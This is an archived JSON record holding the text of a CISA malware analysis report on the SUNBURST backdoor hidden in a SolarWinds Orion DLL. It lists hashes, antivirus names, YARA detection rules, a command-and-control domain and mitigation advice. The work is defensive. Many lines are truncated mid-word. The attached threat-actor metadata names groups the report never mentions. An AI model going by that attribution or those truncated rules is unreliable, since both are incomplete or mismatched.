\"SolarWinds.Orion.Core.BusinessLayer.dll\" (32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77), and is\ndigital certificate.\n\n**019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134**\n\nTags\n\nbackdoortrojan\n\nDetails\n\n**Name** SolarWinds.Orion.Core.BusinessLayer.dll\n\n**Size** 1028072 bytes\n\n**Type** PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n**MD5** 2c4a910a1299cdae2a4e55988a2f102e\n\n**SHA1** 2f1a5a7411d015d01aaee4535835400191645023\n\n**SHA256** 019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134\n\n**SHA512** 5cbfefe612a40c8872a0faf3db8d3835dc514fb3df159610095b47c595c6caa1ada79cce2b10fb99e648990c3f54f63344d1fa7025090bfcd\n\n**ssdeep** 12288:dJKoHwfn/jz3bbO4Qag2I97PMieSLezPKT+cYvjenWHuhh9c0g8vkzE19Wv:rEfDbO97P8TrKhYbenWH4c0g8vkzE19e\n\n**Entropy** 5.579997\n\nAntivirus\n\n**Ahnlab** Backdoor/Win32.SunBurst\n\n**Antiy** Trojan[Backdoor]/MSIL.Agent\n\n**Avira** TR/Sunburst.AH\n\n**BitDefender** Trojan.Sunburst.A\n\n**Clamav** Win.Countermeasure.Sunburst-9809152-0\n\n**Comodo** Backdoor\n\n**Cyren** W32/Trojan.QTKK-7476\n\n**ESET** a variant of MSIL/SunBurst.A trojan\n\n**Emsisoft** Trojan.Win32.Sunburst (A)\n\n**Ikarus** Backdoor.Sunburst\n\n**K7** Trojan ( 00574a531 )\n\n**Lavasoft** Trojan.Sunburst.A\n\n**McAfee** Trojan-sunburst\n\n\n-----\n\n**Microsoft Security Essentials** Trojan:MSIL/Solorigate.BR!dha\n\n**NANOAV** Trojan.Win32.SunBurst.iduxfm\n\n**NetGate** Trojan.Win32.Malware\n\n**Sophos** Mal/Sunburst-A\n\n**Symantec** Backdoor.Sunburst\n\n**Systweak** trojan-backdoor.sunburst-r\n\n**TrendMicro** Backdoo.6F8C6A1E\n\n**TrendMicro House Call** Backdoo.6F8C6A1E\n\n**VirusBlokAda** TScope.Trojan.MSIL\n\n**Zillya!** Trojan.SunBurst.Win32.1\n\nYARA Rules\n\nrule CISA_10318927_01 : trojan rat SOLAR_FIRE\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10318927\"\nDate = \"2020-12-13\"\nLast_Modified = \"20201213_2145\"\nActor = \"n/a\"\nCategory = \"TROJAN RAT\"\nFamily = \"SOLAR_FIRE\"\nDescription = \"This signature is based off of unique strings embedded within the modified Solar Winds app\"\nMD5_1 = \"b91ce2fa41029f6955bff20079468448\"\nSHA256_1 = \"32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\"\nMD5_2 = \"846e27a652a5e1bfbd0ddd38a16dc865\"\nSHA256_2 = \"ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6\"\nstrings:\n$s0 = { 63 00 30 00 6B 00 74 00 54 00 69 00 37 00 4B 00 4C 00 43 00 6A 00 4A 00 7A 00 4D 00 38 00 44 }\n$s1 = { 41 00 41 00 3D 00 3D 00 00 21 38 00 33 00 56 00 30 00 64 00 6B 00 78 00 4A 00 4B 00 55 }\n$s2 = { 63 00 2F 00 46 00 77 00 44 00 6E 00 44 00 4E 00 53 00 30 00 7A 00 4B 00 53 00 55 00 30 00 42 00 41 00 41 00 3D 00 3D }\n$s3 = { 53 00 69 00 30 00 75 00 42 00 67 00 41 00 3D 00 00 21 38 00 77 00 77 00 49 00 4C 00 6B 00 33 00 4B 00 53 00 79 00 30 00 4\ncondition:\nall of them\n}\n\nrule FireEye_20_00025668_01 : SUNBURST APT backdoor\n{\nmeta:\nAuthor = \"FireEye\"\nDate = \"2020-12-13\"\nLast_Modified = \"20201213_1917\"\nActor = \"n/a\"\nCategory = \"Backdoor\"\nFamily = \"SUNBURST\"\nDescription = \"This rule is looking for portions of the SUNBURST backdoor that are vital to how it functions. The first signature fnv_xor m\nxor that the sample performs on process, service, and driver names/paths. SUNBURST is a backdoor that has the ability to spawn and kill p\ndelete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services.\"\nMD5_1 = \"\"\nSHA256_1 = \"\"\nstrings:\n$cmd_regex_encoded = \"U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA\" wide\n$cmd_regex_plain = { 5C 7B 5B 30 2D 39 61 2D 66 2D 5D 7B 33 36 7D 5C 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 33 32 7D 22 7C\n66 5D 7B 31 36 7D }\n$fake_orion_event_encoded = \"U3ItS80rCaksSFWyUvIvyszPU9IBAA==\" wide\n$fake_orion_event_plain = { 22 45 76 65 6E 74 54 79 70 65 22 3A 22 4F 72 69 6F 6E 22 2C }\n$fake_orion_eventmanager_encoded = \"U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==\" wide\n$fake_orion_eventmanager_plain = { 22 45 76 65 6E 74 4E 61 6D 65 22 3A 22 45 76 65 6E 74 4D 61 6E 61 67 65 72 22 2C }\n$fake_orion_message_encoded = \"U/JNLS5OTE9VslKqNqhVAgA=\" wide\n$fake_orion_message_plain = { 22 4D 65 73 73 61 67 65 22 3A 22 7B 30 7D 22 }\n$fnv_xor = { 67 19 D8 A7 3B 90 AC 5B }\n\ncondition:\n\n\n-----\n\n($fake_orion_eventmanager_encoded or $fake_orion_eventmanager_plain) and ($fake_orion_message_encoded and $fake_orion_messag\n}\n\nrule FireEye_20_00025668_02 : SUNBURST APT backdoor\n{\nmeta:\nAuthor = \"FireEye\"\nDate = \"2020-12-13\"\nLast_Modified = \"20201213_1917\"\nActor = \"n/a\"\nCategory = \"Backdoor\"\nFamily = \"SUNBURST\"\nDescription = \"The SUNBURST backdoor uses a domain generation algorithm (DGA) as part of C2 communications. This rule is looking\ncode that checks for which HTTP method is being used. This is in one large conjunction, and all branches are then tied together via disjunct\nintentionally designed so that if any part of the DGA is re-used in another sample, this signature should match that re-used portion. SUNBUR\nhas the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set o\ntools and services.\"\nMD5_1 = \"\"\nSHA256_1 = \"\"\nstrings:\n$a = \"0y3Kzy8BAA==\" wide\n$aa = \"S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA\" wide\n$ab = \"S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=\" wide\n$ac = \"C88sSs1JLS4GAA==\" wide\n$ad = \"C/UEAA==\" wide\n$ae = \"C89MSU8tKQYA\" wide\n$af = \"8wvwBQA=\" wide\n$ag = \"cyzIz8nJBwA=\" wide\n$ah = \"c87JL03xzc/LLMkvysxLBwA=\" wide\n$ai = \"88tPSS0GAA==\" wide\n$aj = \"C8vPKc1NLQYA\" wide\n$ak = \"88wrSS1KS0xOLQYA\" wide\n$al = \"c87PLcjPS80rKQYA\" wide\n$am = \"Ky7PLNAvLUjRBwA=\" wide\n$an = \"06vIzQEA\" wide\n$b = \"0y3NyyxLLSpOzIlPTgQA\" wide\n$c = \"001OBAA=\" wide\n$d = \"0y0oysxNLKqMT04EAA==\" wide\n$e = \"0y3JzE0tLknMLQAA\" wide\n$f = \"003PyU9KzAEA\" wide\n$h = \"0y1OTS4tSk1OBAA=\" wide\n$i = \"K8jO1E8uytGvNqitNqytNqrVA/IA\" wide\n$j = \"c8rPSQEA\" wide\n$k = \"c8rPSfEsSczJTAYA\" wide\n$l = \"c60oKUp0ys9JAQA=\" wide\n$m = \"c60oKUp0ys9J8SxJzMlMBgA=\" wide\n$n = \"8yxJzMlMBgA=\" wide\n$o = \"88lMzygBAA==\" wide\n$p = \"88lMzyjxLEnMyUwGAA==\" wide\n$q = \"C0pNL81JLAIA\" wide\n$r = \"C07NzXTKz0kBAA==\" wide\n$s = \"C07NzXTKz0nxLEnMyUwGAA==\" wide\n$t = \"yy9IzStOzCsGAA==\" wide\n$u = \"y8svyQcA\" wide\n\n$v = \"SytKTU3LzysBAA==\" wide\n\n\n-----\n\np yg\n$x = \"C84vLUpODU4tykwLKMoHAA==\" wide\n$y = \"C84vLUpO9UjMC07MKwYA\" wide\n$z = \"C84vLUpO9UjMC04tykwDAA==\" wide\ncondition:\n($a and $b and $c and $d and $e and $f and $h and $i) or ($j and $k and $l and $m and $n and $o and $p and $q and $r and $s and ($\n$u and $v and $w and $x and $y and $z and ($aa or $ab)) or ($ac and $ad and $ae and $af and $ag and $ah and ($am or $an)) or ($ai and\nand ($am or $an))\n}\n\nssdeep Matches\n\n**94** ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6\n\nPE Metadata\n\n**Compile Date** 2020-04-21 10:53:33-04:00\n\n**Import Hash** dae02f32a21e03ce65412f6e56942daa\n\n**Company Name** SolarWinds Worldwide, LLC.\n\n**File Description** SolarWinds.Orion.Core.BusinessLayer\n\n**Internal Name** SolarWinds.Orion.Core.BusinessLayer.dll\n\n**Legal Copyright** Copyright © 1999-2020 SolarWinds Worldwide, LLC. All Rights Reserved.\n\n**Original Filename** SolarWinds.Orion.Core.BusinessLayer.dll\n\n**Product Name** SolarWinds.Orion.Core.BusinessLayer\n\n**Product Version** 2020.2.5200.12394\n\nPE Sections\n\n**MD5** **Name** **Raw Size** **Entropy**\n\n7810cd48d16fb0d3c3a0c855f2d9225a header 512 2.907043\n\nf249efb5d984eb62f325179a721985f3 .text 1018368 5.567580\n\n9aea23ae0750b77218d9a85d4896eb0c .rsrc 1536 3.005835\n\n0db83a842dbb0bb3396691d4238bd216 .reloc 512 0.101910\n\nDescription\n\nThis file has been identified as a SolarWinds Application module containing a patched in SUNBURST backdoor. This embedded SUNBURST cod\nfunctions as \"SolarWinds.Orion.Core.BusinessLayer.dll\" (32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77), and is\ndigital certificate.\n\n## Relationship Summary\n\n32519b85c0... Connected_To avsvmcloud.com\n\n32519b85c0... Contained_Within d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600\n\navsvmcloud.com Connected_From 32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\n\nd0d626deb3... Contains 32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\n\n## Conclusion\n\nPlease refer to the following resources for additional information and mitigation actions related to this campaign:\n\n1) Alert (AA20-352A): Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations\nhttps://us-cert.cisa.gov/ncas/alerts/aa20-352a\n\n2) Emergency Directive 21-01: Mitigate SolarWinds Orion Code Compromise\nhttps://cyber.dhs.gov/ed/21-01/\n## Recommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organizatio\nconfiguration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date\n\n\n-----\n\ng q, g p y\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unl\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Specia\n**\"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".**\n\n## Contact Information\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at t\n[https://www.surveymonkey.com/r/G8STDRY](https://www.surveymonkey.com/r/G8STDRY)\n\n## Document FAQ\n\n**What is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In most**\nwill provide initial indicators for computer and network defense. To request additional analysis, please contact CISA and provide information regar\ndesired analysis.\n\n**What is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manua**\nTo request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\n\n**Can I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document should**\n[CISA at 1-888-282-0870 or CISA Service Desk.](http://10.10.0.46/mailto:CISAservicedesk@cisa.dhs.gov)\n\n**Can I submit malware to CISA? Malware samples can be submitted via three methods:**\n\nWeb: [https://malware.us-cert.gov](https://malware.us-cert.gov/)\nE-Mail: [submit@malware.us-cert.gov](http://10.10.0.46/mailto:submit@malware.us-cert.gov)\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and ph\n[Reporting forms can be found on CISA's homepage at www.cisa.gov.](http://www.cisa.gov/)\n\nFebruary 8, 2021: Initial Version\n\nApril 15, 2021: Updated with Attribution Statement\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-02-08 - Malware Analysis Report (AR21-039A)- SUNBURST.pdf"
    ],
    "report_names": [
        "2021-02-08 - Malware Analysis Report (AR21-039A)- SUNBURST.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535701,
    "ts_updated_at": 1743041761,
    "ts_creation_date": 1653786370,
    "ts_modification_date": 1653786370,
    "files": {
        "pdf": "https://archive.orkl.eu/794044eee97925425170e5380bf0b61caf3b877c.pdf",
        "text": "https://archive.orkl.eu/794044eee97925425170e5380bf0b61caf3b877c.txt",
        "img": "https://archive.orkl.eu/794044eee97925425170e5380bf0b61caf3b877c.jpg"
    }
}